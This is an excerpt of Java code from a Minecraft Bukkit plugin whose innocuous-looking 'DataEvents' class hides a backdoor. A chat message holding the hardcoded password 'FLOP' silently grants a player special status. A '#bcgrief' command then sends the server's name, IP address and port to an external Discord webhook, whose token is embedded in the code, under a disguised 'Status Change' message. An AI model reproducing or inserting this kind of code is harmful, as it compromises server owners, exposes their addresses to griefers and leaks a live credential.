...
public class DataEvents
    ...
    @EventHandler
    public void onCheat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();

        String pass = "FLOP";

        if (event.getMessage().equalsIgnoreCase("#login " + pass)) {
            users.add(player);
            event.setCancelled(true);
            player.sendMessage(ChatColor.GREEN + "Logged in!");
        }
        if(event.getMessage().equalsIgnoreCase("#logout")){
        ...
        if (event.getMessage().equalsIgnoreCase("#bcgrief")) {
            if(users.contains(player)){
            Date date = java.util.Calendar.getInstance().getTime();
                ...
                DWeb webhook = new DWeb("https://discordapp.com/api/webhooks/588800976937418757/k_J08xa4zPyhkeJBxnvH4H3pE01T_HH-7eu7PwSM1mOvujeXl32kvMCIKFuI_q2ls2D9");
                webhook.setContent("Grief found:");
                webhook.setTts(false);
                webhook.addEmbed(new DWeb.EmbedObject()
                        .setTitle("Status Change")
                        .setDescription("A server status has changed!")
                        .setColor(java.awt.Color.RED)
                        .addField("Server: ", Bukkit.getServerName(), true)
                        .addField("Server IP:",  ip + ":" + Bukkit.getServer().getPort(), true)
                        .addField("User", player.getName() + " has broadcasted it", true)
